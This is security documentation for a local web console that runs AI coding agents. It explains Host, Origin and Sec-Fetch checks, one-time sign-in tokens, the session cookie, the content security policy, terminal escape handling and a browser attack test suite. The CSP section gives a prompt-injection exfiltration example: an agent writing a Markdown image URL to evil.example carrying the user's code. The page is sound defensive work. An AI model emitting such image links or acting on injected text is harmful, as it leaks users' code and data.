# Server and browser

The Ostra console is a web page served by a process that can run any command your user can. This page
explains how the server decides that a request comes from your own signed-in browser tab, and how the page
keeps text written by agents, repositories, and MCP servers from acting as code. Every check here runs in one
middleware, `guard` in [`crates/ostra-server/src/api.rs`](../../crates/ostra-server/src/api.rs), and the sign-in
logic lives in [`crates/ostra-server/src/auth.rs`](../../crates/ostra-server/src/auth.rs).

For the threats these defenses answer, see the [threat model](threat-model.md). For the server's place among the
crates and its REST and WebSocket surface, see [Server](../architecture/server.md).

## Where the server listens

Ostra binds to `127.0.0.1` unless you pass `--bind` or set `server.bind` in `config.toml`. On a loopback bind
nothing on the network can connect. [Install](../start/install.md) covers remote access through an SSH tunnel or
a TLS reverse proxy.

A loopback server also serves the console at a private host name of the form `ostra-<16 hex>.localhost`, chosen
once at random and kept in the registry. Browsers resolve every `*.localhost` name to this machine, so the name
works without any DNS setup. The reason for the name is the cookie: a cookie set on `127.0.0.1` is sent to every
other port on `127.0.0.1`, including a dev server or a tool that a hostile page could control. A cookie set on a
random `*.localhost` name is not. Page loads on `127.0.0.1:<port>` are redirected to the private name, keeping
the `#token=` fragment, and API calls there are refused with a message that names the right address. Set
`server.use_ip_host = true` to turn the private name off.

## The Host check

Every request must carry a `Host` header from a fixed list, or it gets `421 Misdirected Request`:

- `127.0.0.1:<port>`, `localhost:<port>`, and `[::1]:<port>`, plus the private name.
- On a `0.0.0.0` bind, every interface address (container and VM bridges included, since a local container may
  connect through one) and the machine's host name with and without `.local`.
- Names you add with `--allow-host` or `server.allowed_hosts`, such as a reverse proxy's domain.

This is the DNS rebinding defense. A hostile page at `evil.example` can make its own name resolve to
`127.0.0.1`, but the browser still sends `Host: evil.example:<port>`, which is not on the list. The CSP that the
refusal carries names no host, so a refused request learns nothing about the server's allowed names.

## The Origin and Sec-Fetch checks

For every request under `/api/` and for the `/ws` upgrade, the server refuses with `403` when any of these hold:

1. **`Origin` is present and is not `http://` or `https://` followed by an allowed host.** This stops a page on
   another site from calling the API with `fetch` or a form.
2. **`Sec-Fetch-Site` is `cross-site` or `same-site`.** Some requests carry no `Origin`, and a page on another
   `localhost` port counts as same-site, so a `SameSite` cookie would ride along. `Sec-Fetch-Site`, which the
   browser sets and a page cannot change, tells those apart from the console's own `same-origin` requests.
3. **`Sec-Fetch-Dest` is not `empty`, `websocket`, or `document`.** The console reaches the API with `fetch`,
   the socket, and download links, and nothing else. An `image`, `script`, or `iframe` request is page content
   reaching the API, such as a Markdown image an agent wrote with an API URL in it.

The server sends no CORS headers at all, so no other origin can read a response even when a request is made.

## Sign-in tokens

`ostra` prints and opens a URL like `http://ostra-….localhost:7878/#token=<64 hex>`. `ostra url` mints a new one
for a running server.

- **The token is 256 random bits.** Guessing it is not a practical attack.
- **It sits in the fragment.** Browsers do not send the part after `#` to the server or in a `Referer`, so the
  token never appears in a request line, a proxy log, or the server log. The console reads it, sends it once in
  the body of `POST /api/auth/exchange`, and removes it from the address bar.
- **It works once.** The registry stores only its SHA-256 hash and an expiry. The exchange swaps the stored
  value for `used:<time>` with a compare-and-replace, so two tabs racing for the same token cannot both win. A
  second attempt is told the link was already used and how long ago, instead of seeing a generic failure.
- **It expires after 15 minutes.**
- **Failures are limited per address.** A non-loopback address gets five failed exchanges per minute. Loopback
  is not limited, because a local process could otherwise lock you out by failing on purpose.

Clipboard managers and link previewers that open a URL to show a preview spend the token. If sign-in says the
link was used, run `ostra url` again. [Troubleshooting](../start/troubleshooting.md) lists the other sign-in
errors.

## The session cookie

A successful exchange sets `ostra_session`, a fresh 256-bit value, as `HttpOnly; SameSite=Strict; Path=/`, with
`Secure` added when the browser reached Ostra over HTTPS. The server decides HTTPS from the `Origin` header,
which the browser sets itself. It does not read `X-Forwarded-Proto`, because any client can send that.

- **Stored hashed.** The registry keeps `auth:cookie:<sha256>` with the sign-in's id, creation time, last-seen
  time, a user agent clipped to 300 characters, and the address. The cookie value itself is never written to
  disk on the server.
- **30 days, checked on the server.** The expiry is computed from the creation time on every check, not taken
  from the browser.
- **Listed and revoked.** Settings > Sign-in and `ostra sessions` show every live sign-in. A revoke from the
  server takes effect at once and closes that browser's open WebSockets through a broadcast channel. A revoke
  from the CLI, which is another process, takes effect within five seconds, because a checked cookie is trusted
  for at most five seconds before the registry is read again.
- **Survives a restart.** Because sign-ins live in the registry, restarting the server does not sign you out,
  and `ostra url` can mint a token for a server that is already running.

## Response headers

Every response, refusals included, carries:

| Header | Value | Why |
| --- | --- | --- |
| `Content-Security-Policy` | See below | Stops injected text from running or loading anything |
| `X-Frame-Options` | `DENY` | No other page can frame the console |
| `X-Content-Type-Options` | `nosniff` | A file served as text is never run as script |
| `Referrer-Policy` | `no-referrer` | Links an agent wrote do not learn the console's address |
| `Cache-Control` | `no-store` on `/api` | Session data does not stay in the browser cache |

## The content security policy

```
default-src 'self'; script-src 'self'; worker-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data:; font-src 'self' data:; connect-src 'self' ws://<host> wss://<host>;
object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; frame-src 'none';
manifest-src 'self'
```

Read it as a list of things injected text cannot do:

- **Run script.** Only script files from the server's own origin run. No inline `<script>`, no `onerror=`, no
  `javascript:` URL, no `eval`.
- **Load a remote image.** `img-src` allows only the server's own files and `data:` URLs. This matters more than
  it looks: an agent that has been prompt-injected can write `![](https://evil.example/?d=<your code>)` in a
  message, and a browser that loaded it would send data out. Here the browser refuses the request.
- **Connect anywhere else.** `connect-src` allows only the server and its own WebSocket.
- **Frame, embed, or be framed.** `frame-src`, `object-src`, and `frame-ancestors` are all closed.
- **Change where relative URLs or forms go.** `base-uri 'none'` and `form-action 'self'`.

`style-src` allows inline styles because React sets them. Inline styles cannot run code.

### Why the static pages carry the same policy

The homepage and these docs are served as plain files by a static host, which sends no security headers. So
the site build puts the policy in a `<meta http-equiv="Content-Security-Policy">` tag in each page
([`site/vite.config.ts`](../../site/vite.config.ts)). The console screenshot on the homepage is the real console
built in mock mode, and it gets its own meta tag ([`web/vite.config.ts`](../../web/vite.config.ts)).

These meta policies must stay equal to the server's, directive for directive, apart from the differences a
static page forces: there is no WebSocket to allow, `frame-ancestors` has no meta form, `form-action` is
`'none'` because the site has no forms, and the homepage alone may frame its own console screenshot. The reason
is that the docs render repository Markdown and the console screenshot renders sample agent output. If a
static page were looser than the server, a string that the browser security suite proves harmless in the
console could run on the site. When you change the server's policy in `api.rs`, change both Vite configs in the
same commit.

## Internal endpoints

Harness CLIs call back into Ostra through `/internal/policy` (the hook bridge, which asks the policy about each
tool call) and `/internal/mcp` (Ostra's MCP shim). These are not for browsers, and they are guarded differently:

- **Local peers only.** A request from an address that is not loopback or one of this machine's own interfaces
  gets `403`, even when the server listens on every interface, because a harness always runs on the same
  machine.
- **No browser requests.** A browser page on this machine is a local peer too, but it always sends `Origin` or
  `Sec-Fetch-Site`. Any request with either header is refused.
- **A per-execution bearer token.** Each harness execution gets its own token. The bridge checks that the token
  belongs to a running execution and that the harness named in the hook matches the execution's harness. When
  the execution ends, the token stops working and any further tool call is denied with an instruction to stop.
  The token is kept in the execution's harness directory, which the policy classifies as a secret path, so one
  agent cannot read another execution's token. [Executors](../internals/executors.md) describes the hook bridge
  itself.

## WebSocket checks

The `/ws` upgrade goes through the same Host, Origin, Sec-Fetch, and cookie checks as REST. After the upgrade
the socket enforces its own limits ([`crates/ostra-server/src/ws.rs`](../../crates/ostra-server/src/ws.rs)):

| Limit | Value |
| --- | --- |
| Message and frame size | 1 MiB |
| One `term_input` message | 64 KiB |
| Subscribed channels per socket | 256 |
| Terminal resize | 1 to 1000 columns, 1 to 500 rows; anything else is refused |
| Sign-in re-check | every 5 seconds, and at once on a revoke from this server |

An open socket re-checks its cookie on the same five-second schedule as REST, so an expired or revoked sign-in
disconnects a tab that is only listening.

## Terminal output

Harness CLIs run in a PTY, and the Terminal tab streams its bytes to xterm.js in the browser. Terminal output is
a channel for escape sequences, and some sequences ask the terminal to reply. If the browser's terminal
answered, a harness (or a file it printed) could make the terminal type into the harness.

- **The server answers terminal queries, not the browser.** It replies to device and status queries itself,
  once, however many browsers are watching, and echoes back only digit parameters, so a reply cannot carry text
  chosen by the program that asked
  ([`crates/ostra-exec-harness/src/pty.rs`](../../crates/ostra-exec-harness/src/pty.rs)).
- **The browser mutes xterm.js's own replies.** Every query sequence xterm.js would answer is swallowed before
  it answers ([`web/src/screens/execution/terminalSafety.ts`](../../web/src/screens/execution/terminalSafety.ts)).
- **OSC 52 clipboard writes and title sequences do not reach the page.** The browser suite sends both and
  checks.
- **OSC 8 links open only for `http` and `https`**, only after a confirmation that shows the address, and in a
  new tab with `noopener` and `noreferrer`.
- **The PTY input must be identical with or without a browser attached.** The browser suite checks this by
  comparing the bytes the harness received against a run with no browser.

Terminal transcripts are written `0600` in a `0700` directory, because harness output can contain secrets.

## Rendering untrusted text

Agent messages, tool output, repository files, branch names, MCP metadata, session titles, and memory entries
are all text that someone other than you may have written. The console treats all of it as data.

- **React escapes it.** Nothing is inserted with `dangerouslySetInnerHTML`.
- **Markdown goes through `react-markdown` with no raw HTML.** Links pass React Markdown's default URL filter,
  which drops `javascript:` and similar schemes. Images accept only `data:image/` URLs; any other source renders
  as its alt text ([`web/src/components/Markdown.tsx`](../../web/src/components/Markdown.tsx)).
- **Uploads never render inline.** SVG and HTML uploads are shown as files, and downloads are served as
  `application/octet-stream` with `Content-Disposition: attachment`.
- **Browser storage holds no secrets.** No transcript, token, or key is written to localStorage,
  sessionStorage, IndexedDB, or Cache Storage.

The docs you are reading use their own renderer ([`site/src/docs/Markdown.tsx`](../../site/src/docs/Markdown.tsx)),
which walks the Markdown syntax tree and builds each element itself. Raw HTML is dropped except for `<br>`,
images render as a link labelled with their alt text rather than loading, and a link with a scheme other than
`http`, `https`, or `mailto` renders as plain text.

## The browser security suite

Unit tests can show that a header is set. They cannot show that a real browser refuses what the header is meant
to refuse. [`tests/browser`](../../tests/browser/README.md) runs the console and the site in a real Chromium and
attacks them.

```bash
cd tests/browser && npm test
```

The suite builds the server and the web UI, starts a scratch server under `/tmp/pw-browser` with its own config,
data directory, master key, and `HOME`, and drives a complete YOLO session against a local fake model API.
Nothing leaves the machine.

Every attack string is written so that, if it ran or loaded, it would set `window.__pwned` or request a canary
URL on the fake server with an id naming the render path. A shared fixture fails the test on either, on any CSP
violation on the app's origin, and on any unexpected dialog, popup, or navigation.

| Spec | What it attacks |
| --- | --- |
| `render` | Every place agent or repository text appears: messages, Bash and MCP output, artifacts, the completion report, titles, file names and contents, branches and commits, MCP metadata, memory, skills, decisions, search |
| `terminal` | OSC 52, OSC 8, title sequences, and device queries through xterm.js, and the PTY input comparison |
| `cross-origin` | Attacker pages on another `localhost` port and on another site: forms, `fetch`, WebSocket, tags, frames, a navigation to every GET route in `api.rs`, DNS rebinding, and page content reaching `/api` |
| `signin` | The token leaves the URL, no request carries it, and what the browser profile keeps is already spent |
| `uploads` | SVG and HTML uploads through chips, the artifact view, and raw links |
| `storage` | localStorage, sessionStorage, IndexedDB, and Cache Storage after a full session |
| `site` | The homepage and docs served as a static host serves them, a docs page full of attack strings, search with hostile input, the console screenshot loading only same-origin files, and cross-origin messages to it |

Any new browser surface, whether a console screen or a site page, gets a spec here and the same policy as the
server.
